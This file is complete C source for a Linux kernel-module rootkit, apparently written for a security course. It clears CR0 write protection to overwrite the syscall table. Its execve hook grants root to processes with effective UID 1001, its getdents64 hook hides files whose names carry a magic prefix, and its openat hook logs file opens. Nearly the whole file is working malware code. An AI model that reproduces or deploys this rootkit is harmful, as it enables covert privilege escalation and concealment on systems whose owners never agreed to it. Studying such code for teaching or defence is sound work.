/*
 * Rootkit Framework
*/

#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>

#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define MODULE_NAME "rootkit"

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
        char            pad;
        char            d_type;
};

unsigned long cr0;
static unsigned long *__sys_call_table;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

static t_syscall original_openat; // create a variable to store the original openat function

/*
 *  create a variable as above to store the original execve and getdents functions
*/
asmlinkage long (*original_execve)(const struct pt_regs* regs);
asmlinkage long (*original_getdents64)(const struct pt_regs *regs);

/*
 * The suffix to use for the openat hook code. This is the file extension
 * we will be detecting. See insert.sh for how this is passed to the rootkit.
*/
static char* suffix;
module_param(suffix, charp, 0);
MODULE_PARM_DESC(suffix, "Received suffix parameter");

//******
//	Accept root_uid as a kernel module parameter 
//******
/*
 * When a user with an effective UID = root_uid runs a command via execve()
 * we make our hook grant them root priv. root_uid's value is provided as a
 * kernel module argument.
 */
static int root_uid;
module_param(root_uid, int, 0);
MODULE_PARM_DESC(root_uid, "Received root_uid parameter");

//******
//	Accept magic_prefix as a kernel module parameter
//******
/*
 * Files that start with a prefix matching magic_prefix are removed from the
 * linux_dirent64* buffer that is returned to the caller of getdents()
 */
static char* magic_prefix;
module_param(magic_prefix, charp, 0);
MODULE_PARM_DESC(magic_prefix, "Received magic_prefix parameter");

/* 
 * Update the string provided to the kallsyms_lookup_name function
 * Locates the address of the system call table using kallsyms_lookup_name
 * and returns it as an unsigned long *
*/
unsigned long * get_syscall_table_bf(void){
  unsigned long *syscall_table;
  syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
  return syscall_table;
}


/*
 * Our version of the syscall is defined here. We want to match the return type
 * and argument signature of the original syscall.
 * This is an example of how to hook openat(). Our version will print to the
 * kernel which file the function was called for.
*/
asmlinkage int new_openat(const struct pt_regs* regs){
  // Declare our return value and a variable to store the filename
  long ret;
  char *filename;
  size_t filename_len;
  size_t suffix_len;

  // Get the filename the syscall was called for
  filename = kmalloc(4096, GFP_KERNEL); // alocate kernel memory

  // copy the filename into the kernel variable
  if (strncpy_from_user(filename, (void*) regs->si, 4096) < 0){
    kfree(filename);
    return 0;
  }

  // Check if the file is a .txt (has the .txt extension)
  filename_len = strlen(filename);
  suffix_len = strlen(suffix);
  if (filename_len >= suffix_len){
    if (strncmp(filename + (filename_len - suffix_len), suffix, suffix_len) == 0){
      printk(KERN_INFO "openat() called for %s\n", filename);
    }
  }

  kfree(filename);

  // Invoke the original openat syscall
  ret = original_openat(regs);

  return ret;
}

asmlinkage int new_execve(const struct pt_regs* regs){
  // Declare our return value and a variable to store the filename
  int ret;
  char *filename;

  // Get the filename the syscall was called for
  filename = kmalloc(4096, GFP_KERNEL); // alocate kernel memory

  if (!filename) {
      // Allocation failed, return 0
      return 0;
  }

  // copy the filename into the kernel variable
  if (strncpy_from_user(filename, (void*) regs->di, 4096) < 0){
    kfree(filename);
    return 0;
  }
    
  printk(KERN_INFO "Executing %s\n", filename);
  printk(KERN_INFO "Effective UID %d\n", current_euid());

  struct cred *new_cred = prepare_creds();  
  if (__kuid_val(current_euid()) == 1001) {
      //Modify the new_cred be UID and eUID of 0
      new_cred->uid = make_kuid(current_user_ns(), 0);
      new_cred->euid = make_kuid(current_user_ns(), 0);
      //Commit new_cred
      commit_creds(new_cred);
      printk(KERN_INFO "Root privallage granted to %s\n", filename);
  }

  kfree(filename);

  // Invoke the original openat syscall
  ret = original_execve(regs);

  return ret;
}

asmlinkage long new_getdents64(const struct pt_regs *regs) {
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *prev = NULL;
    long nread;
    unsigned long bpos = 0;
    unsigned long count;

    // Log the invocation of the hook
    printk(KERN_INFO "getdents() hook invoked.\n");

    // Call the original getdents64 syscall using pt_regs
    nread = original_getdents64(regs);
    if (nread <= 0)
      return nread;

    // Allocate kernel memory to copy the directory entries to
    dirent_ker = kzalloc(nread, GFP_KERNEL);
    if (dirent_ker == NULL)
      return nread;

    // Copy from user to kernel space
    copy_from_user(dirent_ker, dirent, nread);

    // Iterate over the directory entries
    for (bpos = 0; bpos < nread;) {
        current_dir = (void *)dirent_ker + bpos;

        // Print the name of each entry
        printk(KERN_INFO "entry: %s\n", current_dir->d_name);

      // If the current entry starts with the magic prefix, skip it
      if (strncmp(magic_prefix, current_dir->d_name, strlen(magic_prefix)) == 0) {
        // If this is the first entry, set the first entry to the next entry
        if (prev == dirent_ker) {
          nread -= current_dir->d_reclen;
          // Move the memory to the next entry 
          memmove(current_dir, (void *)current_dir + current_dir->d_reclen, nread);
          continue;
        }
        // If this is not the first entry, set the previous entry to the next entry
        if (prev){
          prev->d_reclen += current_dir->d_reclen;
        }
      } else {
        // If the current entry does not start with the magic prefix, move to the next entry
        prev = current_dir;
      }

        // Move to the next entry
        bpos += current_dir->d_reclen;
    }

    // Copy the modified directory entries back to user space
    copy_to_user(dirent, dirent_ker, nread);

    // Free the kernel memory
    kfree(dirent_ker);

    // Return the number of bytes read
    return nread;
}

/*
 * Used to let us modify memory regions and syscalls
*/
static inline void write_cr0_forced(unsigned long val){
  unsigned long __force_order;
  asm volatile(
    "mov %0, %%cr0"
    : "+r"(val), "+m"(__force_order));
}

/*
 * Protect memory (so it can't be modified)
*/
static inline void protect_memory(void){
  write_cr0_forced(cr0);
}

/*
 * Unprotect memory (so we can modify it)
*/
static inline void unprotect_memory(void)
{
  write_cr0_forced(cr0 & ~0x00010000);
}

/*
 * Module initalization
*/
static int __init init_rootkit(void)
{
  printk(KERN_INFO "Rootkit module initializing.\n");

  __sys_call_table = get_syscall_table_bf(); // Get the sys_call_table information

  if (!__sys_call_table)
    return -1;

  cr0 = read_cr0();


  original_openat = (t_syscall)__sys_call_table[__NR_openat];
  original_execve = (t_syscall)__sys_call_table[__NR_execve];
  original_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];

  /*
   *  Unprotect the memory by calling the appropriate function
  */
  unprotect_memory();
  

  __sys_call_table[__NR_openat] = (unsigned long) new_openat;

  __sys_call_table[__NR_execve] = (unsigned long)new_execve;
  __sys_call_table[__NR_getdents64] = (unsigned long)new_getdents64;

  /*
   *  Protect the memory by calling the appropriate function
  */
  protect_memory();
  
  printk(KERN_INFO "Rootkit module is loaded!\n");
  return 0; // For successful load
}

static void __exit cleanup_rootkit(void){
  printk(KERN_INFO "Rootkit module is unloaded!\n");

  /*
   *  Unprotect the memory by calling the appropriate function
  */
  unprotect_memory();

  __sys_call_table[__NR_openat] = (unsigned long)original_openat;

  /*
   *  Unhook and restore the execve and getdents functions
  */
  __sys_call_table[__NR_execve] = (unsigned long)original_execve;
  __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;


  /*
   *  Protect the memory by calling the appropriate function
  */
  protect_memory();

  printk(KERN_INFO "Rootkit module cleanup copmlete.\n");
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_AUTHOR("Your Friendly Neighbourhood Hacker");
MODULE_LICENSE("GPL");